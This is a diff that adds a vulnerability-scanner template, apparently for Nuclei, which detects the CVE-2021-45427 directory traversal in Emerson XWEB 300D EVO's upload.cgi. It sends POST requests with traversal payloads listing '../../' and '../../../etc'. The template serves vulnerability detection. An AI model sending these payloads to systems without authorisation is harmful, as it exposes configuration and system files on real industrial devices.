@@ -1,0 +1,48 @@
+id: CVE-2021-45427
+info:
+  name: EMERSON-XWEB-EVO upload.cgi Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Emerson XWEB 300D EVO 3.0.7 -- 3ee403 has a directory traversal vulnerability (CVE-2021-45427). An attacker may access sensitive files including configuration files, logs, source codes, etc., by browsing the directory structure.
+  reference:
+    - https://www.cvedetails.com/cve/CVE-2021-45427/
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2021-45427
+  tags: directory-traversal
+http:
+  - raw:
+      - |
+        POST /cgi-bin/upload.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        action=list&path=../../
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"list":['
+        part: body
+  - raw:
+      - |
+        POST /cgi-bin/upload.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        action=list&path=../../../etc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"list":['
+        part: body
